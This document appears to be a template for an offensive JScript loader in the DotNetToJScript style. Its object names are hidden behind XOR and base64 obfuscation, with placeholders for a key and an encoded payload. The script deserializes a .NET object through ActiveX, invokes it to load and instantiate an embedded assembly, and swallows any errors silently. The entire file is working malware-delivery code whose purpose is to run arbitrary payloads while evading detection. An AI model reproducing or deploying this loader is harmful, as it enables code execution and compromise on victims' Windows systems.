%ARRAY%

var %NEWARRAY%=[]
	
function xor(text, key) {
	var encryptedText = "";
	for (var i = 0; i < text.length; i++) {
	  var textChar = text.charCodeAt(i);
	  var encryptedChar = textChar ^ key;
	  encryptedText += String.fromCharCode(encryptedChar);
	}
	return encryptedText;
}

decodeBase64 = function(s) {
	var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
	var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	for(i=0;i<64;i++){e[A.charAt(i)]=i;}
	for(x=0;x<L;x++){
		c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
		while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
	}
	return r;
};

var originalLength = %NEWARRAY%.length;

for (var i = 0; i < %ARRAYNAME%.length; i++) {

	%NEWARRAY%[ originalLength + i]= xor(decodeBase64( %ARRAYNAME%[i]) ,%KEY%);    

	}
function setversion() {
	new ActiveXObject(%NEWARRAY%[0]).Environment(%NEWARRAY%[1])(%NEWARRAY%[2]) = %NEWARRAY%[3];
	}


	

	function debug(s) {}
	function base64ToStream(b) {
		var enc = new ActiveXObject(%NEWARRAY%[4]);
		var length = enc.GetByteCount_2(b);
		var ba = enc.GetBytes_4(b);
		var transform = new ActiveXObject(%NEWARRAY%[5]);
		ba = transform.TransformFinalBlock(ba, 0, length);
		var ms = new ActiveXObject(%NEWARRAY%[6]);
		ms.Write(ba, 0, (length / 4) * 3);
		ms.Position = 0;
		return ms;
	}



	%B64PAYLOAD%

	var serialized_obj = %VAR%;
	var entry_class = 'TestClass';

try {
	setversion();
	var decodedPayload= xor(decodeBase64(serialized_obj),%KEY%);
	var stm = base64ToStream(decodedPayload);
	var fmt = new ActiveXObject(%NEWARRAY%[7]);
	var al = new ActiveXObject(%NEWARRAY%[8]);
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}
